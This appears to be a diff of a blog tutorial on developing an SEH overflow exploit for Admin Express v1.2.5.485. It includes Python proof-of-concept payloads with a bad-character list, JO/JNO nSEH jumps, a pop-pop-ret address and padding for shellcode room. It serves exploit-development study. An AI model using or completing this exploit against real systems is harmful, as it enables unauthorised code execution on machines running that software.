@@ -119,9 +119,8 @@ Step through with `F7`. We reach our nSEH jump instruction, but we notice someth
 Well, this is a problem. A short jump is the typical instruction for jumping we are used to. It is evidently a bad character. We now need to determine what all of the other bad characters are. [Here](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/) is a place that automatically stores all of the characters possible into a variable. Here is the updated PoC:
 
 ```console
-
+root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
 # Proof of Concept - Admin Express v1.2.5.485 Exploit
-
 
 badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
 "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
@@ -182,3 +181,31 @@ print payload
 #f.close()
 ```
 
+We repeat all of the same steps as above to crash the application, and we see below we have reached our jump:
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/11.png" alt="">
+
+Awesome! The jump is ready to be taken! Our `O` flag is set to 0 at the current time of the instruction, so our jump will occur when the `JNO` operation is loaded into EIP for execution. We have a slight issue though. Look at the image below:
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/12.png" alt="">
+
+We see there are some null bytes. These bytes are contained in our buffer of C's, not much farther down than our jump instruction. I am a paranoid person when it comes to having enough space for shellcode. Therefore,, I decided to change my PoC to add __a lot__ more jumps. This way, we get way the heck away from those null bytes and we will have plenty of room to write our shellcode.  Here is the updated PoC:
+
+```console
+root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
+# Proof of Concept - Admin Express v1.2.5.485 Exploit
+
+payload = "\x41" * 4260
+payload += "\x70\x7e\x71\x7e"		# JO 126 bytes. If jump fails, default to JNO 126 bytes
+payload += "\x42\x4c\x01\x10"		# 0x10014c42 pop pop ret wmiwrap.DLL
+
+# There are 2 NULL (\x00) terminators in our buffer of A's, near our nSEH jump. We are going to jump far away from them
+# so we have enough room for our shellcode and to decode.
+payload += "\x41" * 122			# add padding since we jumped 7e hex bytes (126 bytes) above
+payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x41" * 124
+payload += "\x70\x7e\x71\x7e"		# JO or JNO another 126 bytes, so shellcode can decode
+payload += "\x41" * 124
+payload += "\x70\x79\x71\x79"		# JO or JNO only 121 bytes
+payload += "\x41" * 121			# NOP is in the restricted characters. Using \x41 as a slide into alignment
+```
